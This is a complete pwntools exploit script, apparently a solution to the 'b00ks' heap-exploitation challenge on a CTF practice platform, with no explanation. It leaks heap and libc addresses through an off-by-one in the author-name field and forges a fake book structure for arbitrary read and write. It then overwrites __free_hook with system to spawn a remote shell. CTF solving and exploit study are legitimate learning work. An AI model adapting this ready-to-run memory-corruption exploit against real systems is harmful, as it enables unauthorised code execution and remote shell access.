from pwn import *

context.log_level = 'debug'

#p = process('./b00ks')
p = remote('node4.buuoj.cn', 29569)
libc = ELF('libc-2.23.buu.so')

ru = lambda s : p.recvuntil(s)
sl = lambda s : p.sendline(s)
sn = lambda s : p.send(s)
rv = lambda s : p.recv(s)
sla = lambda r, s : p.sendlineafter(r, s)
sa = lambda r, s : p.sendafter(r, s)

def debug(s):
    gdb.attach(p, '''
        source ~/libc/loadsym.py
        loadsym ~/libc/2.23/64/libc-2.23.debug.so
    ''' + s)

def alloc(namesize, name, descsize, desc):
    sla(b'> ', b'1')
    sla(b'size: ', str(namesize).encode())
    sa(b'chars): ', name)
    sla(b'size: ', str(descsize).encode())
    sa(b'description: ', desc)

def delete(id):
    sla(b'> ', b'2')
    sla(b'delete: ', str(id).encode())

def edit(id, content):
    sla(b'> ', b'3')
    sla(b'want to edit: ', str(id).encode())
    sa(b'description: ', content)

def show():
    sla(b'> ', b'4')

def author(name):
    sla(b'> ', b'5')
    sa(b'name: ', name)

sla(b'name: ', b'a' * 0x20 + b'\n')

alloc(0xd0, b'a\n', 0x20, b'a\n')
alloc(0x2330000, b'a\n', 0x2330000, b'a\n')
show()
ru(b'a' * 0x20)
book1 = u64(rv(6).ljust(8, b'\x00'))
success('heap_base -> {}'.format(hex(book1)))
edit(1, p64(1) + p64(book1 + 0x38) + p64(book1 + 0x40) + p64(0xffff) + b'\n')

author(b'a' * 0x20 + b'\n')
show()

libc_base = u64(ru(b'\x7f')[-6:].ljust(8, b'\x00')) + 0x2330000 + 0x1000 - 0x10
success('libc_base -> {}'.format(hex(libc_base)))

free_hook = libc_base + libc.sym['__free_hook']
system = libc_base + libc.sym['__libc_system']
bin_sh = libc_base + next(libc.search(b'/bin/sh'))

edit(1, p64(free_hook) + b'\n')
edit(2, p64(system) + b'\n')
edit(1, p64(bin_sh) + b'\n')

delete(2)

p.interactive()